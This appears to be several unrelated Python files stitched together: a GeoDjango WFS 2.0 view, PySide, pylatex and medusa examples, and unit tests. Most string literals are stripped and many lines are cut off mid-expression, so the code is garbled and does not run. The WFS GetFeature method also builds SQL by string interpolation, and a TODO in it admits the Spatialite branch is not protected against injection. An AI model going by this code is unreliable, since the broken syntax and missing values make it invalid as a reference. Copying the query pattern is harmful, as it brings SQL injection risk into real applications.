PresentationParameters , \n 
AdHocQueryParameters , \n 
StoredQueryParameters \n 
) : \n 
~~~ pass \n 
\n 
~~ def _parse_xml_GetFeature ( self , request ) : \n 
~~~ """\n        """ \n 
raise OperationNotSupported . at ( "GetFeature" , "XML encoded POST for WFS.GetFeature needs implemented" #TODO implement this method. \n 
\n 
~~ def GetFeature ( self , request , kwargs ) : \n 
~~~ """\n        """ \n 
mimetypes = { \n 
: \n 
} \n 
\n 
if in kwargs : \n 
~~~ parms = self . _parse_xml_GetFeature ( kwargs [ ] ) \n 
~~ else : \n 
~~~ parms = GetFeatureMixin . Parameters . create ( kwargs ) \n 
\n 
# must be an OGR dataset or a QuerySet containing one layer \n 
~~ response = self . adapter . get_features ( request , parms ) \n 
if isinstance ( response , GeoQuerySet ) : \n 
~~~ layer = None \n 
db_params = settings . DATABASES [ response . db ] \n 
if db_params [ ] . endswith ( ) : \n 
# Then we take the raw SQL from thr QuerySet and pass it through OGR instead.  This causes the SQL to be # but it gets it out the door for now. \n 
\n 
# Create the query from the QuerySet \n 
# adapt() prevents SQL injection attacks \n 
~~~ from psycopg2 . extensions import adapt \n 
query , parameters = response . query . get_compiler ( response . db ) . as_sql ( ) \n 
parameters = tuple ( [ adapt ( p ) for p in parameters ] ) \n 
query = query % parameters \n 
\n 
# Connect to PostGIS with OGR. \n 
drv = ogr . GetDriverByName ( "PostgreSQL" ) \n 
connection_string = "PG:dbname=\'{db}\'" . format ( db = db_params [ ] ) \n 
if in db_params and db_params [ ] : \n 
~~~ connection_string += " host=\'{host}\'" . format ( host = db_params [ ] ) \n 
~~ if in db_params and db_params [ ] : \n 
~~~ connection_string += " port=\'{port}\'" . format ( port = db_params [ ] ) \n 
~~ if in db_params and db_params [ ] : \n 
~~~ connection_string += " user=\'{user}\'" . format ( user = db_params [ ] ) \n 
~~ if in db_params and db_params [ ] : \n 
~~~ connection_string += " password=\'{password}\'" . format ( password = db_params [ ~~ conn = drv . Open ( connection_string ) \n 
\n 
# Put the QuerySet into a layer the hard way. \n 
layer = conn . ExecuteSQL ( query . encode ( ) ) \n 
\n 
~~ elif db_params [ ] . endswith ( ) : \n 
# This works the same way as the if-statement above. \n 
# todo replace this with the sqlite version of the same thing for preventing SQL injection attacks ~~~ from psycopg2 . extensions import adapt \n 
query , parameters = response . query . get_compiler ( response . db ) . as_sql ( ) \n 
parameters = tuple ( [ adapt ( p ) for p in parameters ] ) \n 
query = query % parameters \n 
\n 
drv = ogr . GetDriverByName ( "Spatialite" ) \n 
conn = drv . Open ( db_params [ ] ) \n 
layer = conn . ExecuteSQL ( query ) \n 
~~ ~~ else : \n 
~~~ layer = response . GetLayerByIndex ( 0 ) \n 
\n 
~~ drivers = dict ( [ ( ogr . GetDriver ( drv ) . GetName ( ) , ogr . GetDriver ( drv ) ) for drv in range ( ogr . GetDriverCount output_format = parms . cleaned_data [ ] . decode ( ) \n 
if in output_format or in output_format : \n 
~~~ tmpname = "{tmpdir}{sep}{uuid}.{output_format}" . format ( tmpdir = gettempdir ( ) , uuid = uuid4 ( ) drv = ogr . GetDriverByName ( "GML" ) \n 
ds = drv . CreateDataSource ( tmpname ) \n 
l2 = ds . CopyLayer ( layer , ) \n 
l2 . SyncToDisk ( ) \n 
del ds \n 
responsef = open ( tmpname ) \n 
rdata = responsef . read ( ) \n 
responsef . close ( ) \n 
os . unlink ( tmpname ) \n 
return HttpResponse ( rdata , mimetype = output_format ) \n 
~~ elif output_format in drivers : \n 
~~~ tmpname = "{tmpdir}{sep}{uuid}.{output_format}" . format ( tmpdir = gettempdir ( ) , uuid = uuid4 ( ) drv = drivers [ output_format ] \n 
ds = drv . CreateDataSource ( tmpname ) \n 
l2 = ds . CopyLayer ( layer , ) \n 
l2 . SyncToDisk ( ) \n 
del ds \n 
responsef = open ( tmpname ) \n 
rdata = responsef . read ( ) \n 
responsef . close ( ) \n 
os . unlink ( tmpname ) \n 
return HttpResponse ( rdata , mimetype = mimetypes . get ( output_format , ) ) \n 
~~ else : \n 
~~~ raise OperationProcessingFailed . at ( , \n 
~~ ~~ ~~ class ListStoredQueriesMixin ( WFSBase ) : \n 
~~~ """\n    Defines the ListStoredQueries operation in section 14.3 of the standard\n    """ \n 
def ListStoredQueries ( self , request , kwargs ) : \n 
~~~ """\n        """ \n 
queries = self . adapter . list_stored_queries ( request ) \n 
response = etree . Element ( "ListStoredQueriesResponse" ) \n 
for query , description in queries . items ( ) : \n 
~~~ sub = etree . SubElement ( response , "StoredQuery" ) \n 
etree . SubElement ( sub , "Title" ) . text = query \n 
for feature_type in description . feature_types : \n 
~~~ etree . SubElement ( sub , ) . text = feature_type \n 
~~ ~~ return HttpResponse ( etree . tostring ( response , pretty_print = True ) , mimetype = ) \n 
\n 
\n 
~~ ~~ class DescribeStoredQueriesMixin ( WFSBase ) : \n 
~~~ class Parameters ( CommonParameters ) : \n 
~~~ stored_query_id = MultipleValueField ( ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . getlist ( ) \n 
\n 
~~ ~~ def DescribeStoredQueries ( self , request , kwargs ) : \n 
~~~ parms = DescribeStoredQueriesMixin . Parameters . create ( kwargs ) \n 
inspected_queries = parms . cleaned_data [ ] \n 
response = etree . Element ( ) \n 
for query , description in filter ( lambda ( x , y ) : x in inspected_queries , self . adapter . list_stored_queries ~~~ desc = etree . SubElement ( response , "StoredQueryDescription" ) \n 
etree . SubElement ( desc , ) . text = query \n 
for parameter in description . parameters : \n 
~~~ p = etree . SubElement ( desc , "Parameter" , attrib = { "name" : parameter . name , "type" : parameter etree . SubElement ( p , ) . text = parameter . title \n 
etree . SubElement ( p , ) . text = parameter . abstractS \n 
if parameter . query_expression : \n 
~~~ etree . SubElement ( p , "QueryExpressionText" , attrib = { \n 
"isPrivate" : parameter . query_expression . private == True , \n 
"language" : parameter . query_expression . language , \n 
"returnFeatureTypes" : . join ( parameter . query_expression . return_feature_types } ) . text = parameter . query_expression . text \n 
~~ ~~ ~~ return HttpResponse ( etree . tostring ( response , pretty_print = True ) , mimetype = ) \n 
\n 
# TODO implement stored queries \n 
~~ ~~ class CreateStoredQuery ( WFSBase ) : \n 
~~~ def CreateStoredQuery ( self , request , kwargs ) : \n 
~~~ raise OperationNotSupported . at ( "CreateStoredQuery" ) \n 
\n 
~~ ~~ class DropStoredQuery ( WFSBase ) : \n 
~~~ def DropStoredQuery ( self , request , kwargs ) : \n 
~~~ raise OperationNotSupported . at ( "DropStoredQuery" ) \n 
\n 
\n 
# TODO implement transactions \n 
~~ ~~ class TransactionMixin ( WFSBase ) : \n 
~~~ def Transaction ( self , request , kwargs ) : \n 
~~~ """\n        """ \n 
raise OperationNotSupported . at ( ) \n 
\n 
~~ ~~ class GetFeatureWithLockMixin ( WFSBase ) : \n 
~~~ def GetFeatureWithLock ( self , request , kwargs ) : \n 
~~~ raise OperationNotSupported . at ( "GetFeatureWithLock" ) \n 
\n 
~~ ~~ class LockFeatureMixin ( WFSBase ) : \n 
~~~ def LockFeature ( self , request , kwargs ) : \n 
~~~ raise OperationNotSupported . at ( ) \n 
\n 
~~ ~~ class GetPropertyValueMixin ( WFSBase ) : \n 
~~~ class Parameters ( StoredQueryParameters , AdHocQueryParameters ) : \n 
~~~ value_reference = f . CharField ( ) \n 
resolve_path = f . CharField ( required = False ) \n 
\n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request [ ] \n 
request [ ] = request [ ] \n 
\n 
~~ ~~ def GetPropertyValue ( self , request , kwargs ) : \n 
~~~ raise OperationNotSupported . at ( ) \n 
\n 
~~ ~~ class WFS ( \n 
common . OWSView , \n 
GetCapabilitiesMixin , \n 
DescribeFeatureTypeMixin , \n 
DescribeStoredQueriesMixin , \n 
GetFeatureMixin , \n 
ListStoredQueriesMixin , \n 
GetPropertyValueMixin \n 
) : \n 
~~~ """ A generic view supporting the WFS 2.0.0 standard from the OGC""" \n 
adapter = None \n 
models = None \n 
title = None \n 
keywords = [ ] \n 
fees = None \n 
access_constraints = None \n 
provider_name = None \n 
addr_street = None \n 
addr_city = None \n 
addr_admin_area = None \n 
addr_postcode = None \n 
addr_country = None \n 
addr_email = None \n 
\n 
def __init__ ( self , ** kwargs ) : \n 
~~~ common . OWSView . __init__ ( self , ** kwargs ) \n 
if self . models : \n 
~~~ self . adapter = GeoDjangoWFSAdapter ( self . models ) \n 
\n 
~~ ~~ def get_capabilities_response ( self , request , params ) : \n 
~~~ return render_to_response ( , { \n 
"title" : self . title , \n 
"keywords" : self . keywords , \n 
"fees" : self . fees , \n 
"access_constraints" : self . access_constraints , \n 
"endpoint" : request . build_absolute_uri ( ) . split ( ) [ 0 ] , \n 
"output_formats" : [ ogr . GetDriver ( drv ) . GetName ( ) for drv in range ( ogr . GetDriverCount ( ) ) "addr_street" : self . addr_street , \n 
"addr_city" : self . addr_city , \n 
"addr_admin_area" : self . addr_admin_area , \n 
"addr_postcode" : self . addr_postcode , \n 
"addr_country" : self . addr_country , \n 
"feature_versioning" : False , \n 
"transactional" : False , \n 
: self . adapter . get_feature_descriptions ( request ) \n 
} ) \n 
\n 
\n 
\n 
~~ ~~ class WFST ( WFS , TransactionMixin , GetFeatureWithLockMixin , LockFeatureMixin ) : \n 
~~~ """ A generic view supporting the WFS 2.0.0 standard from the OGC including transactions""" \n 
def get_capabilities_response ( self , request , params ) : \n 
~~~ return render_to_response ( , { \n 
"title" : self . title , \n 
"keywords" : self . keywords , \n 
"fees" : self . fees , \n 
"access_constraints" : self . access_constraints , \n 
"endpoint" : request . build_absolute_uri ( ) . split ( ) [ 0 ] , \n 
"output_formats" : [ ogr . GetDriver ( drv ) . GetName ( ) for drv in range ( ogr . GetDriverCount ( ) ) "addr_street" : self . addr_street , \n 
"addr_city" : self . addr_city , \n 
"addr_admin_area" : self . addr_admin_area , \n 
"addr_postcode" : self . addr_postcode , \n 
"addr_country" : self . addr_country , \n 
"feature_versioning" : self . adapter . supports_feature_versioning ( ) , \n 
"transactional" : True , \n 
: self . adapter . get_feature_descriptions ( request ) \n 
} ) \n 
~~ ~~ from sondra . document . valuehandlers import DateTime , Geometry , Now \n 
from shapely . geometry import Point \n 
from datetime import datetime \n 
import rethinkdb as r \n 
import pytest \n 
\n 
from sondra . tests . api import * \n 
from sondra . auth import Auth \n 
\n 
s = ConcreteSuite ( ) \n 
\n 
api = SimpleApp ( s ) \n 
auth = Auth ( s ) \n 
AuthenticatedApp ( s ) \n 
AuthorizedApp ( s ) \n 
s . ensure_database_objects ( ) \n 
\n 
\n 
@ pytest . fixture ( scope = ) \n 
def simple_doc ( request ) : \n 
~~~ simple_doc = s [ ] [ ] . create ( { \n 
: "valuehandler test" , \n 
"date" : datetime . now ( ) , \n 
"value" : 0 \n 
} ) \n 
def teardown ( ) : \n 
~~~ simple_doc . delete ( ) \n 
~~ request . addfinalizer ( teardown ) \n 
return simple_doc \n 
\n 
\n 
~~ @ pytest . fixture ( scope = ) \n 
def fk_doc ( request , simple_doc ) : \n 
~~~ fk_doc = s [ ] [ ] . create ( { \n 
: "valuehandler test foreign key" , \n 
: simple_doc , \n 
: [ simple_doc ] \n 
} ) \n 
def teardown ( ) : \n 
~~~ fk_doc . delete ( ) \n 
~~ request . addfinalizer ( teardown ) \n 
return fk_doc \n 
\n 
\n 
~~ def test_foreignkey ( fk_doc , simple_doc ) : \n 
~~~ retr_doc = s [ ] [ ] [ ] \n 
\n 
# make sure our object representation is the JSON one in the retrieved object. \n 
assert isinstance ( fk_doc . obj [ ] , str ) \n 
assert fk_doc . obj [ ] == simple_doc . url \n 
\n 
# make sure our object representation is the JSON one in the retrieved object. \n 
assert isinstance ( retr_doc . obj [ ] , str ) \n 
assert retr_doc . obj [ ] == simple_doc . url \n 
\n 
storage_repr = fk_doc . rql_repr ( ) \n 
assert storage_repr [ ] == simple_doc . id \n 
\n 
assert isinstance ( fk_doc [ ] , SimpleDocument ) import os \n 
\n 
~~ from PySide . QtGui import * \n 
from PySide . QtCore import * \n 
\n 
from ui_Event import Ui_Event \n 
\n 
\'\'\'"ID":eventId,\n                                        "Place":eventPlace,\n                                        "Type":eventType,\n                                        "Players":eventPlayers,\n                                        "Format":eventFormat,\n                                        "Location":eventLocation,\n                                        "Date":eventDate,\n                                        "Opponents":eventOpponents,\n                                        "Wins":eventWins,\n                                        "Losses":eventLosses,\n                                        "Draws":eventDraws,\n                                        "Matches":eventMatches,\n                                        "Deck":"",\n                                        "Notes":"",\'\'\' \n 
\n 
class EventWindow ( QDialog , Ui_Event ) : \n 
~~~ def __init__ ( self , parent , eventId ) : \n 
~~~ super ( EventWindow , self ) . __init__ ( parent ) \n 
self . rent = parent \n 
self . data = parent . eventData [ eventId ] \n 
self . deckAssignment = [ ] \n 
\n 
self . setupUi ( self ) \n 
self . assignWidgets ( ) \n 
\n 
self . setWindowTitle ( unicode ( "%s Event Data" % eventId ) ) \n 
\n 
~~ def savePressed ( self ) : \n 
~~~ self . data [ "Notes" ] = self . notesText . toPlainText ( ) \n 
self . data [ "Deck" ] = self . deckText . text ( ) \n 
self . data [ "Place" ] = self . placeText . text ( ) \n 
self . data [ "Type" ] = self . eventTypeText . text ( ) \n 
self . data [ "Players" ] = self . playersText . text ( ) \n 
self . data [ "Format" ] = self . formatText . text ( ) \n 
self . data [ "Location" ] = self . locationText . text ( ) \n 
self . data [ "Date" ] = self . dateText . text ( ) \n 
\n 
ourCounter = 0 \n 
for ourRound in self . deckAssignment : \n 
~~~ self . data [ "Opponents" ] [ self . deckAssignment [ ourCounter ] [ 0 ] ] [ 2 ] = self . deckAssignment [ ourCounter ourCounter += 1 \n 
\n 
~~ self . rent . updateGUI ( ) \n 
self . rent . messageBox ( "Event changes saved." ) \n 
\n 
~~ def closePressed ( self ) : \n 
~~~ self . hide ( ) \n 
\n 
~~ def roundSelected ( self , ourRound , ourColumn ) : \n 
~~~ ourIndex = int ( ourRound . text ( 0 ) ) - 1 \n 
\n 
deckName , ok = QInputDialog . getText ( self , "Qute Input" , \n 
"Enter Deck Name:" ) \n 
\n 
if ok and deckName : \n 
~~~ self . data [ "Opponents" ] [ ourIndex ] [ 3 ] . setData ( 3 , 0 , deckName ) \n 
self . deckAssignment . append ( [ ourIndex , deckName ] ) \n 
\n 
~~ ~~ def assignWidgets ( self ) : \n 
~~~ self . saveChangesButton . clicked . connect ( self . savePressed ) \n 
self . closeButton . clicked . connect ( self . closePressed ) \n 
self . roundTree . itemDoubleClicked . connect ( self . roundSelected ) \n 
\n 
self . notesText . setPlainText ( self . data [ "Notes" ] ) \n 
self . deckText . setText ( self . data [ "Deck" ] ) \n 
self . placeText . setText ( self . data [ "Place" ] ) \n 
self . eventTypeText . setText ( self . data [ "Type" ] ) \n 
self . playersText . setText ( self . data [ "Players" ] ) \n 
self . formatText . setText ( self . data [ "Format" ] ) \n 
self . locationText . setText ( self . data [ "Location" ] ) \n 
self . dateText . setText ( self . data [ "Date" ] ) \n 
\n 
#Add match data \n 
matchItem = TreeWidgetItem ( self . resultsTree ) \n 
matchItem . setText ( 0 , unicode ( self . data [ "Wins" ] ) ) \n 
matchItem . setText ( 1 , unicode ( self . data [ "Losses" ] ) ) \n 
matchItem . setText ( 2 , unicode ( self . data [ "Draws" ] ) ) \n 
matchItem . setText ( 3 , unicode ( self . data [ "Matches" ] ) ) \n 
\n 
self . resultsTree . addTopLevelItem ( matchItem ) \n 
for i in range ( 4 ) : \n 
~~~ self . resultsTree . resizeColumnToContents ( i ) \n 
\n 
~~ roundCounter = 1 \n 
\n 
for opponent in self . data [ "Opponents" ] : \n 
~~~ roundItem = TreeWidgetItem ( self . roundTree ) \n 
roundItem . setText ( 0 , unicode ( roundCounter ) ) \n 
roundItem . setText ( 1 , unicode ( opponent [ 0 ] ) ) \n 
roundItem . setText ( 2 , unicode ( opponent [ 1 ] ) ) \n 
roundItem . setText ( 3 , unicode ( opponent [ 2 ] ) ) \n 
\n 
opponent [ 3 ] = roundItem \n 
\n 
self . roundTree . addTopLevelItem ( roundItem ) \n 
roundCounter += 1 \n 
\n 
~~ for i in range ( 4 ) : \n 
~~~ self . roundTree . resizeColumnToContents ( i ) \n 
\n 
#Custom object to allow sorting by number and alpha \n 
~~ ~~ ~~ class TreeWidgetItem ( QTreeWidgetItem ) : \n 
~~~ def __init__ ( self , parent = None ) : \n 
~~~ QTreeWidgetItem . __init__ ( self , parent ) \n 
\n 
~~ def __lt__ ( self , otherItem ) : \n 
~~~ column = self . treeWidget ( ) . sortColumn ( ) \n 
try : \n 
~~~ return float ( self . text ( column ) ) > float ( otherItem . text ( column ) ) \n 
~~ except ValueError : \n 
~~~ return self . text ( column ) > otherItem . text ( column ) \n 
#!/usr/bin/python \n 
~~ ~~ ~~ """\nThis example shows numpy functionality.\n\n..  :copyright: (c) 2014 by Jelte Fennema.\n    :license: MIT, see License for more details.\n""" \n 
\n 
# begin-doc-include \n 
import numpy as np \n 
\n 
from pylatex import Document , Section , Subsection , Math , Matrix , VectorName \n 
\n 
if __name__ == : \n 
~~~ a = np . array ( [ [ 100 , 10 , 20 ] ] ) . T \n 
\n 
doc = Document ( ) \n 
section = Section ( ) \n 
subsection = Subsection ( ) \n 
\n 
vec = Matrix ( a ) \n 
vec_name = VectorName ( ) \n 
math = Math ( data = [ vec_name , , vec ] ) \n 
\n 
subsection . append ( math ) \n 
section . append ( subsection ) \n 
\n 
subsection = Subsection ( ) \n 
M = np . matrix ( [ [ 2 , 3 , 4 ] , \n 
[ 0 , 0 , 1 ] , \n 
[ 0 , 0 , 2 ] ] ) \n 
matrix = Matrix ( M , mtype = ) \n 
math = Math ( data = [ , matrix ] ) \n 
\n 
subsection . append ( math ) \n 
section . append ( subsection ) \n 
\n 
subsection = Subsection ( ) \n 
\n 
math = Math ( data = [ , vec_name , , Matrix ( M * a ) ] ) \n 
subsection . append ( math ) \n 
\n 
section . append ( subsection ) \n 
\n 
doc . append ( section ) \n 
doc . generate_pdf ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ import quantities as pq \n 
\n 
from pylatex . quantities import _dimensionality_to_siunitx , Quantity \n 
\n 
\n 
def test_quantity ( ) : \n 
~~~ v = 1 * pq . m / pq . s \n 
\n 
q1 = Quantity ( v ) \n 
assert q1 . dumps ( ) == \n 
\n 
q2 = Quantity ( v , format_cb = lambda x : str ( int ( x ) ) ) \n 
assert q2 . dumps ( ) == \n 
\n 
q3 = Quantity ( v , options = { : } ) \n 
ref = \n 
assert q3 . dumps ( ) == ref \n 
\n 
\n 
~~ def test_quantity_float ( ) : \n 
~~~ q1 = Quantity ( 42.0 ) \n 
assert q1 . dumps ( ) == \n 
\n 
\n 
~~ def test_quantity_uncertain ( ) : \n 
~~~ t = pq . UncertainQuantity ( 7. , pq . second , 1. ) \n 
q1 = Quantity ( t ) \n 
assert q1 . dumps ( ) == \n 
\n 
\n 
~~ def test_dimensionality_to_siunitx ( ) : \n 
~~~ assert _dimensionality_to_siunitx ( ( pq . volt / pq . kelvin ) . dimensionality ) == \n 
\n 
~~ if __name__ == : \n 
~~~ test_quantity ( ) \n 
test_dimensionality_to_siunitx ( ) \n 
# -*- Mode: Python -*- \n 
\n 
# Demonstrates use of the auth and put handlers to support publishing \n 
# web pages via HTTP. \n 
\n 
# It is also possible to set up the ftp server to do essentially the \n 
# same thing. \n 
\n 
\n 
# only slightly more secure than using FTP: both techniques involve \n 
# sending a unencrypted password of the network (http basic auth \n 
\n 
# much more secure, but not widely supported yet. <sigh> \n 
\n 
~~ from supervisor . medusa import asyncore_25 as asyncore \n 
from supervisor . medusa import default_handler \n 
from supervisor . medusa import http_server \n 
from supervisor . medusa import put_handler \n 
from supervisor . medusa import auth_handler \n 
from supervisor . medusa import filesys \n 
\n 
\n 
# You can of course use anything that supports the mapping interface, \n 
# and it would be pretty easy to set this up to use the crypt module \n 
# on unix. \n 
\n 
users = { : , : } \n 
\n 
# The filesystem we will be giving access to \n 
fs = filesys . os_filesystem ( ) \n 
\n 
\n 
dh = default_handler . default_handler ( fs ) \n 
\n 
# Supports the HTTP PUT method... \n 
ph = put_handler . put_handler ( fs , ) \n 
\n 
# ... but be sure to wrap it with an auth handler: \n 
ah = auth_handler . auth_handler ( users , ph ) \n 
\n 
# Create a Web Server \n 
hs = http_server . http_server ( ip = , port = 8080 ) \n 
\n 
# install the handlers we created: \n 
\n 
hs . install_handler ( dh ) # for GET \n 
hs . install_handler ( ah ) # for PUT \n 
\n 
asyncore . loop ( ) \n 
# -*- Mode: Python -*- \n 
\n 
import socket \n 
import string \n 
from supervisor . medusa import asyncore_25 as asyncore \n 
from supervisor . medusa import asynchat_25 as asynchat \n 
\n 
# get some performance figures for an HTTP/1.1 server. \n 
# use pipelining. \n 
\n 
class test_client ( asynchat . async_chat ) : \n 
\n 
~~~ ac_in_buffer_size = 16384 \n 
ac_out_buffer_size = 16384 \n 
\n 
total_in = 0 \n 
\n 
concurrent = 0 \n 
max_concurrent = 0 \n 
\n 
def __init__ ( self , addr , chain ) : \n 
~~~ asynchat . async_chat . __init__ ( self ) \n 
self . create_socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
self . set_terminator ( ) \n 
self . connect ( addr ) \n 
self . push ( chain ) \n 
\n 
~~ def handle_connect ( self ) : \n 
~~~ test_client . concurrent = test_client . concurrent + 1 \n 
if ( test_client . concurrent > test_client . max_concurrent ) : \n 
~~~ test_client . max_concurrent = test_client . concurrent \n 
\n 
~~ ~~ def handle_expt ( self ) : \n 
~~~ print \n 
self . close ( ) \n 
\n 
~~ def close ( self ) : \n 
~~~ test_client . concurrent = test_client . concurrent - 1 \n 
asynchat . async_chat . close ( self ) \n 
\n 
~~ def collect_incoming_data ( self , data ) : \n 
~~~ test_client . total_in = test_client . total_in + len ( data ) \n 
\n 
~~ def found_terminator ( self ) : \n 
~~~ pass \n 
\n 
~~ def log ( self , * args ) : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ import time \n 
\n 
class timer : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . start = time . time ( ) \n 
\n 
~~ def end ( self ) : \n 
~~~ return time . time ( ) - self . start \n 
\n 
~~ ~~ def build_request_chain ( num , host , request_size ) : \n 
~~~ s = % ( request_size , host ) \n 
sl = [ s ] * ( num - 1 ) \n 
sl . append ( \n 
% ( \n 
request_size , host \n 
) \n 
) \n 
return string . join ( sl , ) \n 
\n 
~~ if __name__ == : \n 
~~~ import string \n 
import sys \n 
if len ( sys . argv ) != 6 : \n 
~~~ print % sys . argv ~~ else : \n 
~~~ host = sys . argv [ 1 ] \n 
\n 
ip = socket . gethostbyname ( host ) \n 
\n 
[ port , request_size , num_requests , num_conns ] = map ( \n 
string . atoi , sys . argv [ 2 : ] \n 
) \n 
\n 
chain = build_request_chain ( num_requests , host , request_size ) \n 
\n 
t = timer ( ) \n 
for i in range ( num_conns ) : \n 
~~~ test_client ( ( host , port ) , chain ) \n 
~~ asyncore . loop ( ) \n 
total_time = t . end ( ) \n 
\n 
# ok, now do some numbers \n 
total_bytes = test_client . total_in \n 
num_trans = num_requests * num_conns \n 
throughput = float ( total_bytes ) / total_time \n 
trans_per_sec = num_trans / total_time \n 
\n 
sys . stderr . write ( % total_time ) \n 
sys . stderr . write ( % num_trans ) \n 
sys . stderr . write ( % total_bytes ) \n 
sys . stderr . write ( % throughput ) \n 
sys . stderr . write ( % trans_per_sec ) \n 
sys . stderr . write ( % test_client . max_concurrent ) \n 
\n 
sys . stdout . write ( \n 
string . join ( \n 
map ( str , ( num_conns , num_requests , request_size , throughput , trans_per_sec ) \n 
) + \n 
) \n 
~~ ~~ from os import * \n 
from os import _exit \n 
import os \n 
\n 
class FakeOS : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . orig_uid = os . getuid ( ) \n 
self . orig_gid = os . getgid ( ) \n 
\n 
~~ def setgroups ( * args ) : \n 
~~~ return \n 
\n 
~~ def getuid ( ) : \n 
~~~ return 0 \n 
\n 
~~ def setuid ( arg ) : \n 
~~~ self . uid = arg \n 
self . setuid_called = 1 \n 
\n 
~~ def setgid ( arg ) : \n 
~~~ self . gid = arg \n 
self . setgid_called = 1 \n 
\n 
~~ def clear ( ) : \n 
~~~ self . uid = orig_uid \n 
self . gid = orig_gid \n 
self . setuid_called = 0 \n 
self . setgid_called = 0 \n 
\n 
~~ ~~ fake = FakeOS ( ) \n 
\n 
setgroups = fake . setgroups \n 
getuid = fake . getuid \n 
setuid = fake . setuid \n 
setgid = fake . setgid \n 
clear = fake . clear \n 
import toto \n 
from toto . invocation import * \n 
from tornado . ioloop import IOLoop \n 
\n 
@ asynchronous \n 
def invoke ( handler , params ) : \n 
~~~ def receive_message ( message ) : \n 
~~~ handler . respond ( result = { : message } ) \n 
~~ handler . register_event_handler ( , receive_message , deregister_on_finish = True ) \n 
~~ import unittest \n 
\n 
from uuid import uuid4 \n 
from time import time , sleep \n 
from toto . tasks import TaskQueue , AwaitableInstance , InstancePool \n 
from tornado . ioloop import IOLoop \n 
from tornado . gen import coroutine \n 
\n 
class _Instance ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . counter = 0 \n 
\n 
~~ def increment ( self ) : \n 
~~~ self . counter += 1 \n 
return self . counter \n 
\n 
~~ def value ( self ) : \n 
~~~ return self . counter \n 
\n 
~~ ~~ class TestTasks ( unittest . TestCase ) : \n 
\n 
~~~ def test_add_task ( self ) : \n 
~~~ queue = TaskQueue ( ) \n 
self . assertEquals ( len ( queue ) , 0 ) \n 
task_results = [ ] \n 
task = lambda x : task_results . append ( x ) \n 
queue . add_task ( task , 1 ) \n 
queue . add_task ( task , 2 ) \n 
queue . add_task ( task , 3 ) \n 
start = time ( ) \n 
while 1 : \n 
~~~ if len ( task_results ) == 3 : \n 
~~~ break \n 
~~ if time ( ) - start > 5 : \n 
~~~ break \n 
~~ sleep ( 0.01 ) \n 
~~ self . assertEquals ( len ( task_results ) , 3 ) \n 
self . assertEquals ( task_results , [ 1 , 2 , 3 ] ) \n 
\n 
~~ def test_yield_task ( self ) : \n 
~~~ queue = TaskQueue ( ) \n 
task_results = [ ] \n 
@ coroutine \n 
def yield_tasks ( ) : \n 
~~~ task = lambda x : x \n 
futures = [ ] \n 
futures . append ( queue . yield_task ( task , 1 ) ) \n 
futures . append ( queue . yield_task ( task , 2 ) ) \n 
futures . append ( queue . yield_task ( task , 3 ) ) \n 
res = yield futures \n 
task_results [ : ] = res \n 
~~ loop = IOLoop ( ) \n 
loop . make_current ( ) \n 
loop . run_sync ( yield_tasks ) \n 
self . assertEquals ( len ( task_results ) , 3 ) \n 
self . assertEquals ( task_results , [ 1 , 2 , 3 ] ) \n 
\n 
~~ def test_add_task_exception ( self ) : \n 
~~~ queue = TaskQueue ( ) \n 
self . assertEquals ( len ( queue ) , 0 ) \n 
task_results = [ ] \n 
def task ( x ) : \n 
~~~ task_results . append ( x ) \n 
raise Exception ( ) \n 
~~ queue . add_task ( task , 1 ) \n 
queue . add_task ( task , 2 ) \n 
queue . add_task ( task , 3 ) \n 
start = time ( ) \n 
while 1 : \n 
~~~ if len ( task_results ) == 3 : \n 
~~~ break \n 
~~ if time ( ) - start > 5 : \n 
~~~ break \n 
~~ sleep ( 0.01 ) \n 
~~ self . assertEquals ( len ( task_results ) , 3 ) \n 
self . assertEquals ( task_results , [ 1 , 2 , 3 ] ) \n 
\n 
~~ def test_yield_task_exception ( self ) : \n 
~~~ queue = TaskQueue ( ) \n 
task_results = [ ] \n 
@ coroutine \n 
def yield_tasks ( ) : \n 
~~~ def task ( x ) : \n 
~~~ raise Exception ( ) \n 
~~ futures = [ ] \n 
futures . append ( queue . yield_task ( task , 1 ) ) \n 
futures . append ( queue . yield_task ( task , 2 ) ) \n 
futures . append ( queue . yield_task ( task , 3 ) ) \n 
for f in futures : \n 
~~~ try : \n 
~~~ yield f \n 
~~ except Exception as e : \n 
~~~ task_results . append ( e ) \n 
~~ ~~ ~~ loop = IOLoop ( ) \n 
loop . make_current ( ) \n 
loop . run_sync ( yield_tasks ) \n 
self . assertEquals ( len ( task_results ) , 3 ) \n 
for e in task_results : \n 
~~~ self . assertEquals ( e . message , ) \n 
\n 
~~ ~~ def test_awaitable ( self ) : \n 
~~~ instance = _Instance ( ) \n 
instance . increment ( ) \n 
self . assertEquals ( instance . value ( ) , 1 ) \n 
awaitable = AwaitableInstance ( instance ) \n 
@ coroutine \n 
def yield_tasks ( ) : \n 
~~~ self . assertEquals ( ( yield awaitable . increment ( ) ) , 2 ) \n 
self . assertEquals ( ( yield awaitable . increment ( ) ) , 3 ) \n 
self . assertEquals ( ( yield awaitable . increment ( ) ) , 4 ) \n 
self . assertEquals ( ( yield awaitable . value ( ) ) , 4 ) \n 
~~ loop = IOLoop ( ) \n 
loop . make_current ( ) \n 
loop . run_sync ( yield_tasks ) \n 
self . assertEquals ( instance . value ( ) , 4 ) \n 
\n 
~~ def test_instance_pool ( self ) : \n 
~~~ instance1 = _Instance ( ) \n 
instance2 = _Instance ( ) \n 
pool = InstancePool ( [ instance1 , instance2 ] ) \n 
pool . increment ( ) \n 
pool . increment ( ) \n 
self . assertEquals ( instance1 . value ( ) , 1 ) \n 
self . assertEquals ( instance2 . value ( ) , 1 ) \n 
pool . transaction ( lambda i : i . increment ( ) ) \n 
pool . transaction ( lambda i : i . increment ( ) ) \n 
self . assertEquals ( instance1 . value ( ) , 2 ) \n 
self . assertEquals ( instance2 . value ( ) , 2 ) \n 
@ coroutine \n 
def yield_tasks ( ) : \n 
~~~ self . assertEquals ( ( yield pool . await ( ) . increment ( ) ) , 3 ) \n 
self . assertEquals ( ( yield pool . await ( ) . increment ( ) ) , 3 ) \n 
self . assertEquals ( instance1 . value ( ) , 3 ) \n 
